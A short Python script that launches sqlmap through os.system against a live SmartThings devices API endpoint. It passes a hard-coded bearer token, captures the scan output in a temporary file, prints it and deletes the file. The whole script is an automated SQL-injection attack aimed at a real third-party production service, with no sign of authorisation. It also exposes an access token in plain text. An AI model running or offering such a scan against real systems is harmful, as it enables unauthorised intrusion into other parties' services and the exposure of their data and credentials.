import os

# Define the command you want to execute
command = 'sqlmap -u "https://api.smartthings.com/v1/devices" --batch --headers="Authorization: Bearer e97c8c1b-e888-49ac-839d-49ac2dcb27f7" > temp_output.txt'

# Run the command using os.system()
os.system(command)

# Read the contents of the temporary file
with open("temp_output.txt", "r") as file:
    output = file.read()

# Display the output in the terminal
print(output)

# Remove the temporary file
os.remove("temp_output.txt")
